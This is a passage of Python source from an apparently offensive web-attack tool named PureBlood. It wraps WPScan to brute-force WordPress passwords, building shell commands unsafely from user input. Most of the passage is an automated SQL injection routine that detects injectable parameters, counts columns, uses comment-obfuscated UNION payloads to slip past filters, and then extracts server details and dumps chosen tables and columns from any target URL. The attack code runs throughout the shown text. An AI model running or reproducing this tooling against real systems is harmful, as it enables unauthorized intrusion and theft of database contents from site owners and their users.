            subprocess.call('ruby external/wpscan-master/wpscan --batch --no-banner --no-color --update --disable-tls-checks', shell=True)
            print ('\n[#] - Running WPScan:')
            if sys.version_info[0] == 3:
                wp_scan_brutefoce_username = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Username{1})> {2}'.format(green, blue, cyan, red)))
                wp_scan_bruteforce_password = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Password List{1})> {2}'.format(green, blue, cyan, red)))
            elif sys.version_info[0] == 2:
                wp_scan_brutefoce_username = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Username{1})> {2}'.format(green, blue, cyan, red)))
                wp_scan_bruteforce_password = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Password List{1})> {2}'.format(green, blue, cyan, red)))
            try:
                subprocess.call('ruby external/wpscan-master/wpscan -u '+hostname+' -r --batch --no-banner --verbose -t 500 --wordlist '+wp_scan_bruteforce_password+' --username '+wp_scan_brutefoce_username, shell=True)
            except Exception as e:
                print ('[!] - Error: {0}'.format(e))
                time.sleep(2)
                print ('')
                web_application_attack()
        else:
            print ('[#] - Updating WPScan:')
            subprocess.call('wpscan --batch --no-banner --update --disable-tls-checks', shell=True)
            print ('\n[#] - Running WPScan:')
            if sys.version_info[0] == 3:
                wp_scan_brutefoce_username = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Username{1})> {2}'.format(green, blue, cyan, red)))
                wp_scan_bruteforce_password = str(input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Password List{1})> {2}'.format(green, blue, cyan, red)))
            elif sys.version_info[0] == 2:
                wp_scan_brutefoce_username = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Username{1})> {2}'.format(green, blue, cyan, red)))
                wp_scan_bruteforce_password = str(raw_input('{0}PureBlood{1}>{0}WebApplicationAttack{1}>{0}WPScan({3}Set Password List{1})> {2}'.format(green, blue, cyan, red)))
            try:
                subprocess.call('ruby external/wpscan-master/wpscan -u '+hostname+' -r --batch --no-banner --verbose -t 500 --wordlist '+wp_scan_bruteforce_password+' --username '+wp_scan_brutefoce_username, shell=True)
            except Exception as e:
                print ('[!] - Error: {0}'.format(e))
                time.sleep(2)
                print ('')
                web_application_attack()
        print (reset)
        print ('{0}='.format(red) * int(sizex))
        web_application_attack()

    def auto_sql_injection(self, url):
        print ('[#] - Auto SQL Injection Running on -> {0}'.format(url))
        auto_sql_injection_request_origin = requests.get(url)
        auto_sql_injection_request_origin_html = BeautifulSoup(auto_sql_injection_request_origin.text, 'html.parser')
        auto_sql_injection_request_origin_html_h1 = auto_sql_injection_request_origin_html.find_all('h1')
        auto_sql_injection_request_origin_html_h2 = auto_sql_injection_request_origin_html.find_all('h2')
        auto_sql_injection_request_origin_html_h3 = auto_sql_injection_request_origin_html.find_all('h3')
        auto_sql_injection_request_origin_html_p = auto_sql_injection_request_origin_html.find_all('p')
        print ('[~] - Checking If Vulnerable')
        auto_sql_injection_request = requests.get('{0}\''.format(url))
        auto_sql_injection_request_url = '{0}\''.format(url)
        auto_sql_injection_request_result = ''
        auto_sql_injection_request_i = ''
        if auto_sql_injection_request.status_code == 200:
            for db, errors in dbms_errors.items():
                for error in errors:
                    if re.compile(error).search(auto_sql_injection_request.text):
                        error = re.compile(error)
                        auto_sql_injection_request_result = 'Vulnerable1'
                        print ('[+] - Vulnerable: Database -> ({0})'.format(db))
            if auto_sql_injection_request_result == '':
                if auto_sql_injection_request_origin.text != auto_sql_injection_request.text:
                    auto_sql_injection_request_result = 'Vulnerable2'
                    print ('[+] - Vulnerable: NO Syntax Error')
        elif auto_sql_injection_request.status_code == 403:
            print ('[!] - Not Vulnerable!')
        elif auto_sql_injection_request.status_code == 406:
            print ('[!] - Not Vulnerable!')
        if auto_sql_injection_request_result == 'Vulnerable1':
            auto_sql_injection_request_ii = 0
            auto_sql_injection_request_iii = ''
            print ('[~] - Counting How Many Columns:')
            auto_sql_injection_request_orderby = requests.get('{0}\' order by {1}--+'.format(url, '1'))
            if ' order by 1--' in auto_sql_injection_request_orderby.text or 'mysql_fetch_row():' in auto_sql_injection_request_orderby.text:
                auto_sql_injection_orderby_result = 'err1'
            else:
                auto_sql_injection_orderby_result = ''
            if auto_sql_injection_orderby_result == 'err1':
                single_quote_payload = ''
            else:
                single_quote_payload = '\''
            auto_sql_injection_request_orderby = requests.get('{0}{1} order by {2}--+'.format(url, single_quote_payload, '100'))
            if 'Unknown column' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text or '\'order clause\'' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text:
                auto_sql_injection_orderby_result = 'err1'
            elif 'mysql_fetch_row():' in auto_sql_injection_request_orderby.text:
                auto_sql_injection_orderby_result = 'err2'
            else:
                auto_sql_injection_orderby_result = 'err3'
            for i in range(50):
                if i == 0:
                    i = i + 1
                print ('\tColumn -> {0}'.format(str(i)))
                auto_sql_injection_request_orderby = requests.get('{0}{1} order by {2}--+'.format(url, single_quote_payload, str(i)))
                if auto_sql_injection_request_orderby.status_code == 403 or auto_sql_injection_request_orderby.status_code == 406:
                    break
                if auto_sql_injection_orderby_result == 'err1':
                    if 'Unknown column' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text or '\'order clause\'' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text:
                        auto_sql_injection_request_i = i
                        break
                    if '\''+ str(i) + '\'' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text:
                        auto_sql_injection_request_i = i
                        break
                elif auto_sql_injection_orderby_result == 'err2':
                    if 'mysql_fetch_row()' in auto_sql_injection_request_orderby.text:
                        auto_sql_injection_request_i = i
                        break
                elif auto_sql_injection_orderby_result == 'err3':
                    if 'Unknown column' in auto_sql_injection_request_orderby.text or '\'order clause\'' in auto_sql_injection_request_orderby.text:
                        auto_sql_injection_request_i = i
                        break
                    if '\''+ str(i) + '\'' in auto_sql_injection_request_orderby.text:
                        auto_sql_injection_request_i = i
                        break
            if not auto_sql_injection_request_i:
                for i in range(50):
                    if i == 0:
                        i = i + 1
                    print ('\tColumn -> {0}'.format(str(i)))
                    auto_sql_injection_request_orderby = requests.get('{0}{1} order by {2}--+'.format(url, single_quote_payload, str(i)))
                    if auto_sql_injection_request_orderby.status_code == 403 or auto_sql_injection_request_orderby.status_code == 406:
                        break
                    if auto_sql_injection_orderby_result == 'err1':
                        if 'Unknown column' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text or '\'order clause\'' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text:
                            auto_sql_injection_request_i = i
                            break
                        if '\''+ str(i) + '\'' in auto_sql_injection_request_orderby.text and '<div ' not in auto_sql_injection_request_orderby.text:
                            auto_sql_injection_request_i = i
                            break
                    elif auto_sql_injection_orderby_result == 'err3':
                        if 'Unknown column' in auto_sql_injection_request_orderby.text or '\'order clause\'' in auto_sql_injection_request_orderby.text:
                            auto_sql_injection_request_i = i
                            break
                        if '\''+ str(i) + '\'' in auto_sql_injection_request_orderby.text:
                            auto_sql_injection_request_i = i
                            break
            if not auto_sql_injection_request_i:
                print ('[!] - Not Able to Find How Many Columns!')
                print ('')
                web_application_attack()
            print ('[~] - Columns: {0}'.format(str(auto_sql_injection_request_i - 1)))
            for i in range(auto_sql_injection_request_i):
                auto_sql_injection_request_ii = auto_sql_injection_request_ii + 1
                if auto_sql_injection_request_ii == auto_sql_injection_request_i:
                    auto_sql_injection_request_ii = auto_sql_injection_request_ii - 1
                    auto_sql_injection_request_iii += '{0},'.format(str(auto_sql_injection_request_ii))
                    break
                auto_sql_injection_request_iii += '{0},'.format(str(auto_sql_injection_request_ii))
            auto_sql_injection_request_iii = auto_sql_injection_request_iii.replace(str(auto_sql_injection_request_ii) + ',' + str(auto_sql_injection_request_ii) + ',', str(auto_sql_injection_request_ii))
            print ('')
            print ('{2}[{1}#{2}] {3}- {4}Please put "-" after "=". Example: =-1337{0}'.format(reset + bold, green, blue, yellow, cyan))
            if sys.version_info[0] == 3:
                target = str(input('Target> '))
            if sys.version_info[0] == 2:
                target = str(raw_input('Target> '))
            print ('')
            if 'http://' in target:
                url = target
                hostname = target.replace('http://', '')
            elif 'https://' in target:
                url = target
                hostname = target.replace('https://', '')
            if '://' not in target:
                url = 'http://' + target
                hostname = target
            print ('[~] - Finding Vulnerable Column:')
            auto_sql_injection_request_vulncolumn = requests.get('{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii))
            auto_sql_injection_request_vulncolumn_soup = BeautifulSoup(auto_sql_injection_request_vulncolumn.content, 'html.parser')
            auto_sql_injection_request_vulncolumn_nums = re.findall('\d+', str(auto_sql_injection_request_vulncolumn_soup))
            auto_sql_injection_request_vulncolumn_possible_vulncolumn = []
            auto_sql_injection_request_vulncolumn_column = ''
            for i in auto_sql_injection_request_vulncolumn_nums:
                if len(i) < 2:
                    auto_sql_injection_request_vulncolumn_possible_vulncolumn.append(i)
                if i == 0:
                    pass
            auto_sql_injection_request_vulncolumn_possible_vulncolumn = list(set(auto_sql_injection_request_vulncolumn_possible_vulncolumn))
            auto_sql_injection_request_vulncolumn_column = ''
            for i in auto_sql_injection_request_vulncolumn_possible_vulncolumn:
                print ('\tTrying -> {0}'.format(str(i)))
                auto_sql_injection_request_dios_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + i + ',', ',' + dios1 + ',')
                auto_sql_injection_request_dios = requests.get(auto_sql_injection_request_dios_url)
                if 'Table:' in auto_sql_injection_request_dios.text and 'id="PureBlood"' in auto_sql_injection_request_dios.text:
                    auto_sql_injection_request_dios_soup = BeautifulSoup(auto_sql_injection_request_dios.content, 'html.parser')
                    auto_sql_injection_request_dios_url = auto_sql_injection_request_dios_url
                    auto_sql_injection_request_vulncolumn_column = i
                    break
            if not auto_sql_injection_request_vulncolumn_column:
                print ('[!] - Not Able to Find The Vulnerable Column!')
                print ('')
                web_application_attack()
            print ('[+] - Vulnerable Column: {0}'.format(str(auto_sql_injection_request_vulncolumn_column)))
            auto_sql_injection_request_hostname_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_hostname + ',')
            auto_sql_injection_request_tmpdir_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_tmpdir + ',')
            auto_sql_injection_request_datadir_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_datadir + ',')
            auto_sql_injection_request_version_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_version + ',')
            auto_sql_injection_request_basedir_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_basedir + ',')
            auto_sql_injection_request_user_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_user + ',')
            auto_sql_injection_request_database_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_database + ',')
            auto_sql_injection_request_schema_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_schema + ',')
            auto_sql_injection_request_uuid_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_uuid + ',')
            auto_sql_injection_request_system_user_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_system_user + ',')
            auto_sql_injection_request_session_user_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_session_user + ',')
            auto_sql_injection_request_symlink_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_symlink + ',')
            auto_sql_injection_request_ssl_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_ssl + ',')
            auto_sql_injection_request_hostname = requests.get(auto_sql_injection_request_hostname_url)
            auto_sql_injection_request_tmpdir = requests.get(auto_sql_injection_request_tmpdir_url)
            auto_sql_injection_request_datadir = requests.get(auto_sql_injection_request_datadir_url)
            auto_sql_injection_request_version = requests.get(auto_sql_injection_request_version_url)
            auto_sql_injection_request_basedir = requests.get(auto_sql_injection_request_basedir_url)
            auto_sql_injection_request_user = requests.get(auto_sql_injection_request_user_url)
            auto_sql_injection_request_database = requests.get(auto_sql_injection_request_database_url)
            auto_sql_injection_request_schema = requests.get(auto_sql_injection_request_schema_url)
            auto_sql_injection_request_uuid = requests.get(auto_sql_injection_request_uuid_url)
            auto_sql_injection_request_system_user = requests.get(auto_sql_injection_request_system_user_url)
            auto_sql_injection_request_session_user = requests.get(auto_sql_injection_request_session_user_url)
            auto_sql_injection_request_symlink = requests.get(auto_sql_injection_request_symlink_url)
            auto_sql_injection_request_ssl = requests.get(auto_sql_injection_request_ssl_url)
            sqli_hostname_soup = BeautifulSoup(auto_sql_injection_request_hostname.text, 'html.parser')
            sqli_tmpdir_soup = BeautifulSoup(auto_sql_injection_request_tmpdir.text, 'html.parser')
            sqli_datadir_soup = BeautifulSoup(auto_sql_injection_request_datadir.text, 'html.parser')
            sqli_version_soup = BeautifulSoup(auto_sql_injection_request_version.text, 'html.parser')
            sqli_basedir_soup = BeautifulSoup(auto_sql_injection_request_basedir.text, 'html.parser')
            sqli_user_soup = BeautifulSoup(auto_sql_injection_request_user.text, 'html.parser')
            sqli_database_soup = BeautifulSoup(auto_sql_injection_request_database.text, 'html.parser')
            sqli_schema_soup = BeautifulSoup(auto_sql_injection_request_schema.text, 'html.parser')
            sqli_uuid_soup = BeautifulSoup(auto_sql_injection_request_uuid.text, 'html.parser')
            sqli_system_user_soup = BeautifulSoup(auto_sql_injection_request_system_user.text, 'html.parser')
            sqli_session_user_soup = BeautifulSoup(auto_sql_injection_request_session_user.text, 'html.parser')
            sqli_symlink_soup = BeautifulSoup(auto_sql_injection_request_symlink.text, 'html.parser')
            sqli_ssl_soup = BeautifulSoup(auto_sql_injection_request_ssl.text, 'html.parser')
            sqli_hostname = sqli_hostname_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_tmpdir = sqli_tmpdir_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_datadir = sqli_datadir_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_version = sqli_version_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_basedir = sqli_basedir_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_user = sqli_user_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_database = sqli_database_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_schema = sqli_schema_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_uuid = sqli_uuid_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_system_user = sqli_system_user_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_session_user = sqli_session_user_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_symlink = sqli_symlink_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            sqli_ssl = sqli_ssl_soup.find('strong', attrs={'id': 'PureBloodINFO'}).text
            print ('[+] Hostname: {0}'.format(sqli_hostname))
            print ('[+] TMP Directory: {0}'.format(sqli_tmpdir))
            print ('[+] Data Directory: {0}'.format(sqli_datadir))
            print ('[+] Database Version: {0}'.format(sqli_version))
            print ('[+] Base Directory: {0}'.format(sqli_basedir))
            print ('[+] Current User: {0}'.format(sqli_user))
            print ('[+] Current Database: {0}'.format(sqli_database))
            print ('[+] Current Schema: {0}'.format(sqli_schema))
            print ('[+] System UUID Key: {0}'.format(sqli_uuid))
            print ('[+] Current System User: {0}'.format(sqli_system_user))
            print ('[+] Session User: {0}'.format(sqli_session_user))
            print ('[+] Is Sysmlink Enabled?: {0}'.format(sqli_symlink))
            print ('[+] Is SSL Enabled?: {0}'.format(sqli_ssl))
            print ('')
            print ('[~] Dumping Database:')
            auto_sql_injection_request_dios_soup_pureblood = auto_sql_injection_request_dios_soup.findAll('strong', attrs={'id': 'PureBlood'})
            auto_sql_injection_request_dios_soup_pureblood_list = []
            for i in auto_sql_injection_request_dios_soup_pureblood:
                if i.text in auto_sql_injection_request_dios_soup_pureblood_list:
                    pass
                else:
                    auto_sql_injection_request_dios_soup_pureblood_list.append(i.text)
            for i in auto_sql_injection_request_dios_soup_pureblood_list:
                print ('\t{0}'.format(i))
            print ('')
            sqli_table = ''
            user_choice = ''
            sqli_column = []
            print ('{2}[{1}#{2}] {3}- {4}Just enter exit/done if you want to start dumping{0}'.format(reset + bold, green, blue, yellow, cyan))
            while True:
                if sys.version_info[0] == 3:
                    if sqli_table:
                        pass
                    elif not sqli_table:
                        user_choice1 = str(input('Table> '))
                        sqli_table = user_choice1
                    user_choice = str(input('\tColumn> '))
                    if user_choice == 'done' or user_choice == 'exit' or user_choice == '':
                        break
                    else:
                        sqli_column.append(user_choice)
                if sys.version_info[0] == 2:
                    if sqli_table:
                        pass
                    elif not sqli_table:
                        user_choice1 = str(raw_input('Table> '))
                        sqli_table = user_choice1
                    user_choice = str(raw_input('\tColumn> '))
                    if user_choice == 'done' or user_choice == 'exit' or user_choice == '':
                        break
                    else:
                        sqli_column.append(user_choice)
            print ('')
            print ('[~] Dumping Columns:')
            for i in sqli_column:
                auto_sql_injection_request_column_dump_list = []
                auto_sql_injection_request_column_dump_url = '{0}{1} /*!50000Union*/ all select {2} from {3}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii, sqli_table)
                auto_sql_injection_request_column_dump_url = auto_sql_injection_request_column_dump_url.replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_dump_column_payload + ',')
                auto_sql_injection_request_column_dump_url = auto_sql_injection_request_column_dump_url.replace('<column>', i)
                auto_sql_injection_request_column_dump = requests.get(auto_sql_injection_request_column_dump_url)
                auto_sql_injection_request_column_dump_soup = BeautifulSoup(auto_sql_injection_request_column_dump.text, 'html.parser')
                auto_sql_injection_request_column_dump_soup_pureblood = auto_sql_injection_request_column_dump_soup.find_all('strong', attrs={'id': 'PureBloodINFO'})
                for ii in auto_sql_injection_request_column_dump_soup_pureblood:
                    if ii.text in auto_sql_injection_request_column_dump_list:
                        pass
                    elif ii.text not in auto_sql_injection_request_column_dump_list:
                        auto_sql_injection_request_column_dump_list.append(ii.text)
                for iii in auto_sql_injection_request_column_dump_list:
                    print ('\t{0} -> {1}'.format(i, iii))
        elif auto_sql_injection_request_result == 'Vulnerable2': # error_output() == False
            auto_sql_injection_request_ii = 0
            auto_sql_injection_request_iii = ''
            print ('[~] - Counting How Many Columns:')
            auto_sql_injection_request_orderby = requests.get('{0}\' order by {1}--+'.format(url, '1'))
            auto_sql_injection_request_orderby_html = BeautifulSoup(auto_sql_injection_request_orderby.text, 'html.parser')
            if 'mysql_fetch_row():' in auto_sql_injection_request_orderby.text:
                auto_sql_injection_orderby_result = 'err1'
                print ('YES')
            else:
                auto_sql_injection_orderby_result = ''
            if auto_sql_injection_orderby_result == 'err1':
                single_quote_payload = ''
            else:
                single_quote_payload = '\''
            for i in range(50):
                if i == 0:
                    i = i + 1
                print ('\tColumn -> {0}'.format(str(i)))
                auto_sql_injection_request_orderby = requests.get('{0}{1} order by {2}--+'.format(url, single_quote_payload, str(i)))
                auto_sql_injection_request_orderby_html = BeautifulSoup(auto_sql_injection_request_orderby.text, 'html.parser')
                auto_sql_injection_request_orderby_html_h1 = auto_sql_injection_request_orderby_html.find_all('h1')
                auto_sql_injection_request_orderby_html_h2 = auto_sql_injection_request_orderby_html.find_all('h2')
                auto_sql_injection_request_orderby_html_h3 = auto_sql_injection_request_orderby_html.find_all('h3')
                auto_sql_injection_request_orderby_html_p = auto_sql_injection_request_orderby_html.find_all('p')
                if auto_sql_injection_request_orderby.status_code == 403 or auto_sql_injection_request_orderby.status_code == 406:
                    break
                if auto_sql_injection_request_origin_html_h1 != auto_sql_injection_request_orderby_html_h1:
                    auto_sql_injection_request_i = i
                    break
                elif auto_sql_injection_request_origin_html_h2 != auto_sql_injection_request_orderby_html_h2:
                    auto_sql_injection_request_i = i
                    break
                elif auto_sql_injection_request_origin_html_h3 != auto_sql_injection_request_orderby_html_h3:
                    auto_sql_injection_request_i = i
                    break
                elif auto_sql_injection_request_origin_html_p != auto_sql_injection_request_orderby_html_p:
                    auto_sql_injection_request_i = i
                    break
            if not auto_sql_injection_request_i:
                for i in range(50):
                    print ('\tColumn -> {0}'.format(str(i)))
                    auto_sql_injection_request_orderby = requests.get('{0}{1} group by {2}--+'.format(url, single_quote_payload, str(i)))
                    auto_sql_injection_request_orderby_html = BeautifulSoup(auto_sql_injection_request_orderby.text, 'html.parser')
                    auto_sql_injection_request_orderby_html_h1 = auto_sql_injection_request_orderby_html.find_all('h1')
                    auto_sql_injection_request_orderby_html_h2 = auto_sql_injection_request_orderby_html.find_all('h2')
                    auto_sql_injection_request_orderby_html_h3 = auto_sql_injection_request_orderby_html.find_all('h3')
                    auto_sql_injection_request_orderby_html_p = auto_sql_injection_request_orderby_html.find_all('p')
                    if auto_sql_injection_request_orderby.status_code == 403 or auto_sql_injection_request_orderby.status_code == 406:
                        print ('[!] - Not Vulnerable!')
                        print ('')
                        web_application_attack()
                    if auto_sql_injection_request_origin_html_h1 != auto_sql_injection_request_orderby_html_h1:
                        auto_sql_injection_request_i = i
                        break
                    elif auto_sql_injection_request_origin_html_h2 != auto_sql_injection_request_orderby_html_h2:
                        auto_sql_injection_request_i = i
                        break
                    elif auto_sql_injection_request_origin_html_h3 != auto_sql_injection_request_orderby_html_h3:
                        auto_sql_injection_request_i = i
                        break
                    elif auto_sql_injection_request_origin_html_p != auto_sql_injection_request_orderby_html_p:
                        auto_sql_injection_request_i = i
                        break
            if not auto_sql_injection_request_i:
                print ('[!] - Not Able to Find How Many Columns!')
                print ('')
                web_application_attack()
            print ('[+] - Columns: {0}'.format(str(auto_sql_injection_request_i - 1)))
            for i in range(auto_sql_injection_request_i):
                auto_sql_injection_request_ii = auto_sql_injection_request_ii + 1
                if auto_sql_injection_request_ii == auto_sql_injection_request_i:
                    auto_sql_injection_request_ii = auto_sql_injection_request_ii - 1
                    auto_sql_injection_request_iii += '{0},'.format(str(auto_sql_injection_request_ii))
                    break
                auto_sql_injection_request_iii += '{0},'.format(str(auto_sql_injection_request_ii))
            auto_sql_injection_request_iii = auto_sql_injection_request_iii.replace(str(auto_sql_injection_request_ii) + ',' + str(auto_sql_injection_request_ii) + ',', str(auto_sql_injection_request_ii))
            print ('')
            print ('{2}[{1}#{2}] {3}- {4}Please put "-" after "=". Example: =-1337{0}'.format(reset + bold, green, blue, yellow, cyan))
            if sys.version_info[0] == 3:
                target = str(input('Target> '))
            if sys.version_info[0] == 2:
                target = str(raw_input('Target> '))
            print ('')
            if 'http://' in target:
                url = target
                hostname = target.replace('http://', '')
            elif 'https://' in target:
                url = target
                hostname = target.replace('https://', '')
            if '://' not in target:
                url = 'http://' + target
                hostname = target
            print ('[~] - Finding Vulnerable Column:')
            auto_sql_injection_request_vulncolumn = requests.get('{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii))
            auto_sql_injection_request_vulncolumn_soup = BeautifulSoup(auto_sql_injection_request_vulncolumn.content, 'html.parser')
            auto_sql_injection_request_vulncolumn_nums = re.findall('\d+', str(auto_sql_injection_request_vulncolumn_soup))
            auto_sql_injection_request_vulncolumn_possible_vulncolumn = []
            auto_sql_injection_request_vulncolumn_column = ''
            for i in auto_sql_injection_request_vulncolumn_nums:
                if len(i) < 2:
                    auto_sql_injection_request_vulncolumn_possible_vulncolumn.append(i)
                if i == 0:
                    pass
            auto_sql_injection_request_vulncolumn_possible_vulncolumn = list(set(auto_sql_injection_request_vulncolumn_possible_vulncolumn))
            auto_sql_injection_request_vulncolumn_column = ''
            for i in auto_sql_injection_request_vulncolumn_possible_vulncolumn:
                print ('\tTrying -> {0}'.format(str(i)))
                auto_sql_injection_request_dios_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + i + ',', ',' + dios1 + ',')
                auto_sql_injection_request_dios = requests.get(auto_sql_injection_request_dios_url)
                if 'Table:' in auto_sql_injection_request_dios.text and 'id="PureBlood"' in auto_sql_injection_request_dios.text:
                    auto_sql_injection_request_dios_soup = BeautifulSoup(auto_sql_injection_request_dios.content, 'html.parser')
                    auto_sql_injection_request_dios_url = auto_sql_injection_request_dios_url
                    auto_sql_injection_request_vulncolumn_column = i
                    break
            if not auto_sql_injection_request_vulncolumn_column:
                print ('[!] - Not Vulnerable!')
                print ('')
                web_application_attack()
            print ('[+] - Vulnerable Column: {0}'.format(str(auto_sql_injection_request_vulncolumn_column)))
            auto_sql_injection_request_hostname_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_hostname + ',')
            auto_sql_injection_request_tmpdir_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_tmpdir + ',')
            auto_sql_injection_request_datadir_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_datadir + ',')
            auto_sql_injection_request_version_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_version + ',')
            auto_sql_injection_request_basedir_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_basedir + ',')
            auto_sql_injection_request_user_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_user + ',')
            auto_sql_injection_request_database_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_database + ',')
            auto_sql_injection_request_schema_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_schema + ',')
            auto_sql_injection_request_uuid_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_uuid + ',')
            auto_sql_injection_request_system_user_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_system_user + ',')
            auto_sql_injection_request_session_user_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_session_user + ',')
            auto_sql_injection_request_symlink_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_symlink + ',')
            auto_sql_injection_request_ssl_url = '{0}{1} /*!50000Union*/ all select {2}--+'.format(url, single_quote_payload, auto_sql_injection_request_iii).replace(',' + auto_sql_injection_request_vulncolumn_column  + ',', ',' + sqli_payload_ssl + ',')
            auto_sql_injection_request_hostname = requests.get(auto_sql_injection_request_hostname_url)
            auto_sql_injection_request_tmpdir = requests.get(auto_sql_injection_request_tmpdir_url)
            auto_sql_injection_request_datadir = requests.get(auto_sql_injection_request_datadir_url)
